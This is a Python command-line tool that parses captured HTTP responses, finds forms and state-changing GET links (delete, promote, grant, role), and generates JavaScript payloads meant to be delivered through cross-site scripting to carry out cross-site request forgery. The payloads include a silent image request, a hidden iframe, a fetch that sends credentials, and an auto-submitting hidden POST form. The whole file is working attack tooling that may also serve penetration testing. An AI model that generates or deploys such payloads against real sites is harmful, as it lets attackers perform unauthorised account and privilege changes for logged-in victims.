#!/usr/bin/env python3
"""
XSS-to-CSRF Payload Generator
Analyzes HTTP responses and generates contextual attack payloads

Usage:
    python3 xss_csrf_gen.py -f response.txt
    python3 xss_csrf_gen.py --interactive
    cat burp_response.txt | python3 xss_csrf_gen.py --stdin
"""

import re
import json
import sys
import argparse
from urllib.parse import urlparse, parse_qs
from dataclasses import dataclass
from typing import List, Dict, Optional
from bs4 import BeautifulSoup

@dataclass
class CSRFTarget:
    """Represents a potential CSRF target"""
    method: str
    url: str
    parameters: Dict[str, str]
    requires_auth: bool = True
    target_type: str = "unknown"  # form, link, api
    
@dataclass
class SecurityContext:
    """Security controls detected in the response"""
    csrf_tokens: List[str]
    cookie_policies: List[str]
    csp_header: Optional[str]
    cors_headers: Dict[str, str]

class ResponseAnalyzer:
    def __init__(self, raw_response: str):
        try:
            self.raw_response = raw_response.strip()
            if not self.raw_response:
                raise ValueError("Empty response provided")
            
            self.headers, self.body = self._parse_response()
            
            if not self.body:
                raise ValueError("No response body found")
                
            self.soup = BeautifulSoup(self.body, 'html.parser')
            
        except Exception as e:
            raise ValueError(f"Failed to parse HTTP response: {str(e)}")
        
    def _parse_response(self):
        """Split HTTP response into headers and body"""
        try:
            # Handle different line endings
            normalized_response = self.raw_response.replace('\r\n', '\n').replace('\r', '\n')
            
            # Find the header/body separator
            separator_idx = normalized_response.find('\n\n')
            if separator_idx == -1:
                raise ValueError("Invalid HTTP response format - no header/body separator found")
            
            headers_text = normalized_response[:separator_idx]
            body = normalized_response[separator_idx + 2:]
            
            # Validate status line
            lines = headers_text.split('\n')
            if not lines or not lines[0].startswith('HTTP/'):
                raise ValueError("Invalid HTTP response - missing status line")
            
            # Parse headers into dict
            headers = {}
            for line in lines[1:]:  # Skip status line
                if ':' in line:
                    key, value = line.split(':', 1)
                    headers[key.strip().lower()] = value.strip()
                    
            return headers, body
            
        except Exception as e:
            raise ValueError(f"Failed to parse HTTP headers: {str(e)}")
    
    def find_csrf_targets(self) -> List[CSRFTarget]:
        """Find potential CSRF targets in the response"""
        targets = []
        
        try:
            # Find GET-based state-changing operations
            targets.extend(self._find_get_targets())
            
            # Find forms
            targets.extend(self._find_form_targets())
            
        except Exception as e:
            print(f"Warning: Error during target analysis: {str(e)}")
            
        return targets
    
    def _find_get_targets(self) -> List[CSRFTarget]:
        """Find GET links that might change state"""
        targets = []
        
        # Look for suspicious GET parameters
        suspicious_params = [
            'promote', 'delete', 'admin', 'privilege', 'role', 
            'activate', 'disable', 'grant', 'revoke', 'edit',
            'remove', 'add', 'create', 'update', 'modify'
        ]
        
        try:
            links = self.soup.find_all('a', href=True)
            for link in links:
                href = link['href']
                if '?' in href:
                    try:
                        parsed = urlparse(href)
                        params = parse_qs(parsed.query)
                        
                        for suspicious in suspicious_params:
                            if any(suspicious in key.lower() or 
                                  suspicious in str(val).lower() 
                                  for key, val in params.items()):
                                # Flatten parameter values
                                flat_params = {k: v[0] if isinstance(v, list) and v else v 
                                             for k, v in params.items()}
                                targets.append(CSRFTarget(
                                    method="GET",
                                    url=href,
                                    parameters=flat_params,
                                    target_type="link"
                                ))
                                break
                    except Exception as e:
                        print(f"Warning: Failed to parse link {href}: {str(e)}")
                        continue
        except Exception as e:
            print(f"Warning: Failed to analyze GET targets: {str(e)}")
        
        return targets
    
    def _find_form_targets(self) -> List[CSRFTarget]:
        """Find forms that could be CSRF targets"""
        targets = []
        
        try:
            forms = self.soup.find_all('form')
            for form in forms:
                try:
                    method = form.get('method', 'GET').upper()
                    action = form.get('action', '')
                    
                    # Extract form parameters
                    params = {}
                    inputs = form.find_all(['input', 'select', 'textarea'])
                    for inp in inputs:
                        name = inp.get('name')
                        value = inp.get('value', '')
                        if name:
                            params[name] = value
                    
                    targets.append(CSRFTarget(
                        method=method,
                        url=action,
                        parameters=params,
                        target_type="form"
                    ))
                except Exception as e:
                    print(f"Warning: Failed to parse form: {str(e)}")
                    continue
        except Exception as e:
            print(f"Warning: Failed to analyze forms: {str(e)}")
        
        return targets

class PayloadGenerator:
    def __init__(self, targets: List[CSRFTarget]):
        self.targets = targets
    
    def generate_xss_payloads(self) -> Dict[str, List[str]]:
        """Generate XSS payloads for each CSRF target"""
        payloads = {}
        
        for target in self.targets:
            try:
                target_key = f"{target.method} {target.url}"
                if target.method == "GET":
                    payloads[target_key] = self._generate_get_payloads(target)
                elif target.method == "POST":
                    payloads[target_key] = self._generate_post_payloads(target)
            except Exception as e:
                print(f"Warning: Failed to generate payload for {target.url}: {str(e)}")
                continue
        
        return payloads
    
    def _generate_get_payloads(self, target: CSRFTarget) -> List[str]:
        """Generate GET-based CSRF payloads triggered by XSS"""
        payloads = []
        
        try:
            # Image-based payload (works with SameSite=None)
            payloads.append(f"""// Image-based CSRF (silent)
let img = new Image();
img.src = '{target.url}';""")
            
            # Iframe-based payload (hidden)
            payloads.append(f"""// Hidden iframe CSRF
let iframe = document.createElement('iframe');
iframe.src = '{target.url}';
iframe.style.display = 'none';
document.body.appendChild(iframe);""")
            
            # Fetch-based payload (with credentials)
            payloads.append(f"""// Fetch-based CSRF (with credentials)
fetch('{target.url}', {{
    method: 'GET',
    credentials: 'include'
}}).catch(e => console.log('CSRF executed'));""")
            
        except Exception as e:
            print(f"Warning: Error generating GET payloads: {str(e)}")
            
        return payloads
    
    def _generate_post_payloads(self, target: CSRFTarget) -> List[str]:
        """Generate POST-based CSRF payloads"""
        payloads = []
        
        try:
            # Auto-submitting form
            form_inputs = ""
            for param, value in target.parameters.items():
                # Escape single quotes in values
                escaped_value = str(value).replace("'", "\\'")
                form_inputs += f"""
    let input_{param} = document.createElement('input');
    input_{param}.type = 'hidden';
    input_{param}.name = '{param}';
    input_{param}.value = '{escaped_value}';
    form.appendChild(input_{param});"""
            
            payloads.append(f"""// Auto-submitting form CSRF
let form = document.createElement('form');
form.method = 'POST';
form.action = '{target.url}';{form_inputs}

document.body.appendChild(form);
form.submit();""")
            
        except Exception as e:
            print(f"Warning: Error generating POST payloads: {str(e)}")
            
        return payloads

def analyze_response(raw_response: str):
    """Main analysis function"""
    try:
        analyzer = ResponseAnalyzer(raw_response)
        targets = analyzer.find_csrf_targets()
        
        print(f"Found {len(targets)} potential CSRF targets:")
        if not targets:
            print("No CSRF targets detected in the response.")
            print("The response may not contain vulnerable endpoints or forms.")
            return
            
        for i, target in enumerate(targets, 1):
            print(f"  {i}. {target.method} {target.url} ({target.target_type})")
            if target.parameters:
                print(f"     Parameters: {target.parameters}")
        
        generator = PayloadGenerator(targets)
        payloads = generator.generate_xss_payloads()
        
        if payloads:
            print(f"\nGenerated XSS->CSRF payloads:")
            for url, payload_list in payloads.items():
                print(f"\nTarget: {url}")
                print("-" * 50)
                for j, payload in enumerate(payload_list, 1):
                    print(f"Payload {j}:")
                    print(payload)
                    print()
        else:
            print("\nNo payloads could be generated.")
            
    except Exception as e:
        print(f"Error: {str(e)}")
        sys.exit(1)

def read_from_file(filename: str) -> str:
    """Read HTTP response from file"""
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            return f.read()
    except FileNotFoundError:
        print(f"Error: File '{filename}' not found.")
        sys.exit(1)
    except Exception as e:
        print(f"Error reading file '{filename}': {str(e)}")
        sys.exit(1)

def read_from_stdin() -> str:
    """Read HTTP response from stdin"""
    try:
        return sys.stdin.read()
    except Exception as e:
        print(f"Error reading from stdin: {str(e)}")
        sys.exit(1)

def interactive_mode():
    """Interactive mode for pasting responses"""
    print("Interactive Mode - Paste your HTTP response below.")
    print("Press Ctrl+D (Linux/Mac) or Ctrl+Z (Windows) when finished:")
    print("-" * 50)
    
    try:
        lines = []
        while True:
            try:
                line = input()
                lines.append(line)
            except EOFError:
                break
        return '\n'.join(lines)
    except KeyboardInterrupt:
        print("\nCancelled by user.")
        sys.exit(0)

def print_usage_examples():
    """Print usage examples"""
    print("""
Usage Examples:

1. Analyze HTTP response from file:
   python3 xss_csrf_gen.py -f response.txt

2. Interactive mode (paste response directly):
   python3 xss_csrf_gen.py --interactive

3. Pipe from stdin:
   cat burp_response.txt | python3 xss_csrf_gen.py --stdin

4. From Burp Suite:
   - Right-click request/response -> Copy to file
   - Save as response.txt
   - Run: python3 xss_csrf_gen.py -f response.txt

Expected Input Format:
HTTP/1.1 200 OK
Content-Type: text/html
...

<html>
...
</html>
""")

def main():
    parser = argparse.ArgumentParser(
        description="XSS-to-CSRF Payload Generator - Analyzes HTTP responses for CSRF vulnerabilities",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -f response.txt          # Analyze response from file
  %(prog)s --interactive            # Interactive paste mode  
  cat response.txt | %(prog)s --stdin  # Read from pipe
        """
    )
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-f', '--file', help='HTTP response file to analyze')
    group.add_argument('--interactive', action='store_true', 
                      help='Interactive mode - paste response directly')
    group.add_argument('--stdin', action='store_true',
                      help='Read response from stdin/pipe')
    group.add_argument('--examples', action='store_true',
                      help='Show usage examples and exit')
    
    # Handle case where no args provided
    if len(sys.argv) == 1:
        parser.print_help()
        print_usage_examples()
        sys.exit(1)
    
    args = parser.parse_args()
    
    if args.examples:
        print_usage_examples()
        sys.exit(0)
    
    # Check for required dependency
    try:
        import bs4
    except ImportError:
        print("Error: BeautifulSoup4 is required. Install with: pip install beautifulsoup4")
        sys.exit(1)
    
    # Read input based on selected mode
    if args.file:
        response = read_from_file(args.file)
    elif args.interactive:
        response = interactive_mode()
    elif args.stdin:
        response = read_from_stdin()
    
    if not response.strip():
        print("Error: No input received or input is empty.")
        sys.exit(1)
    
    # Analyze the response
    analyze_response(response)

if __name__ == "__main__":
    main()
